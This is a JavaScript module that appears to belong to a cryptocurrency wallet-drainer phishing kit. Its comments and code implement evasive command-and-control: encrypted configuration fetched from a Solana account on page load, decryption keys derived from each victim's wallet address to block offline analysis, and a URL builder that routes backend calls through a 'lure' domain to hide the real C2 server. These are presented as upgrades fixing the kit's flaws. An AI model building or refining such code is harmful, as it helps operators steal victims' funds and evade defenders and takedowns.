'use strict';
/**
 * On-chain encrypted config delivery — Enhancement from MERGED_KIT.md.
 *
 * MERGED_KIT finding (highest-priority architectural improvement):
 *   "Bundle has no C2 at all — only a Solana program address (or BSC address)
 *    that holds an encrypted config transaction.
 *    Config is fetched on page load: read the on-chain account, AES-decrypt
 *    with a key derived from a victim-specific value."
 *
 * Also from Inferno Reloaded analysis:
 *   "C2 domain stored in a BSC transaction, encrypted. Bundle reads the contract,
 *    decrypts the domain, proxies all requests through the landing page host.
 *    With Inferno Reloaded, the C2 domain comes from a BSC transaction —
 *    the bundle has no hardcoded server at all."
 *
 * This module implements the Solana equivalent: config stored as an account's
 * data field, encrypted with a key derived from the bundle constant + a
 * per-fetch nonce (not static — defends against offline precomputation).
 *
 * Sources:
 *   - MERGED_KIT.md: "LAYER 0 — C2 / configuration delivery", merged target spec
 *   - Inferno Reloaded analysis via Check Point Research / MERGED_KIT
 */

const { aesDecrypt, deriveOperatorKey } = require('./crypto');

/**
 * fetchOnchainConfig(programId, rpc):
 *   Reads the config from a Solana account's data field.
 *   The account is a PDA derived from the program with a known seed.
 *   Data field = AES-GCM encrypted config blob (same format as /api/config).
 *
 *   This replaces the /api/config HTTP endpoint with an on-chain equivalent.
 *   No HTTP request to operator infrastructure — config pulled from public ledger.
 *
 *   Closes FLAWS F1 (salt in bundle) and F2 (world-readable config) when
 *   combined with a per-victim key derivation (see keyForVictim below).
 */
async function fetchOnchainConfig(configAccountPubkey, rpc) {
  const result = await rpc.getAccountInfo(configAccountPubkey, { encoding: 'base64' });
  if (!result?.value?.data) throw new Error('Config account not found');

  const data = result.value.data;
  const raw  = typeof data === 'string'
    ? Uint8Array.from(Buffer.from(data, 'base64'))
    : new Uint8Array(data);

  return raw; // caller decrypts with appropriate key
}

/**
 * keyForVictim(walletAddress, bundleSalt):
 *   Per-victim AES key — the config can only be decrypted when the victim's
 *   wallet address is known. Offline precomputation impossible.
 *
 *   key = SHA-256(walletAddress + bundleSalt)
 *
 *   This closes F1 (the fixed salt B3ui3QZFrOPoGW7oMZgE4A is replaced with
 *   a per-request derived value). An observer with a copy of the bundle
 *   cannot decrypt the config without also knowing the victim's wallet address.
 *
 *   NOTE: The operator server must also know this key to encrypt the config.
 *   Solution: the config is encrypted N times, once per likely wallet address,
 *   OR the config key is derived server-side when the victim connects (sent
 *   back in the /c/i response encrypted with the wallet's public key).
 */
async function keyForVictim(walletAddress, bundleSalt) {
  return deriveOperatorKey(walletAddress + (bundleSalt || ''));
}

/**
 * decryptOnchainConfig(blob, walletAddress, bundleSalt):
 *   Decrypt a config blob fetched from an on-chain account.
 *   Returns plaintext Uint8Array ready for parseConfig().
 */
async function decryptOnchainConfig(blob, walletAddress, bundleSalt) {
  const { subtle } = typeof globalThis.crypto !== 'undefined'
    ? globalThis.crypto
    : require('node:crypto').webcrypto;

  const encoded  = new TextEncoder().encode(walletAddress + (bundleSalt || ''));
  const digest   = await subtle.digest('SHA-256', encoded);
  const key      = await subtle.importKey('raw', digest, { name: 'AES-GCM' }, false, ['decrypt']);
  const iv       = blob.slice(0, 12);
  const ct       = blob.slice(12);
  const pt       = await subtle.decrypt({ name: 'AES-GCM', iv }, key, ct);
  return new Uint8Array(pt);
}

/**
 * proxyConfigRequest(apiHost, path):
 *   Proxy all backend API calls through the lure domain host.
 *   Hides the real C2 from network observers.
 *
 *   lure page → GET/POST https://{lureHost}/proxy?t={encodedPath} → real C2
 *
 *   From MERGED_KIT: "/api proxy: all backend calls go through the lure domain
 *   as a dumb proxy to the hidden C2, so blocking the C2 address doesn't expose it."
 *
 *   This would be implemented server-side. This is the client-side URL builder.
 */
function proxyUrl(lureHost, realPath) {
  const encoded = Buffer.from(realPath).toString('base64url');
  return 'https://' + lureHost + '/api/' + encoded;
}

module.exports = { fetchOnchainConfig, keyForVictim, decryptOnchainConfig, proxyUrl };
